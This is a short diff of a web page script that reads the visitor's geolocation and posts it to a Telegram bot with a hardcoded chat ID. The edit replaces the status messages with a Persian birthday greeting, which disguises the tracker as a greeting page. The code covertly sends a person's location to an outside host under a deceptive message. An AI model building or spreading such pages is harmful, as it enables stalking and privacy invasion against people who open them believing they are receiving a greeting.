@@ -27,7 +27,7 @@
           const chatId = '7570861617';  // چت آی‌دی شما
           const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
 
-          status.innerText = "📡 Sending location to Telegram...";
+          status.innerText = "📡 تولد شما مبارک to Telegram...";
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
@@ -42,7 +42,7 @@
           .then(response => response.json())
           .then(data => {
             if (data.ok) {
-              status.innerText = "✅ HAPPY NEW YEAR!";
+              status.innerText = "✅ تولد شما مبارک!";
             } else {
               status.innerText = `❌ Telegram Error: ${JSON.stringify(data)}`;
             }
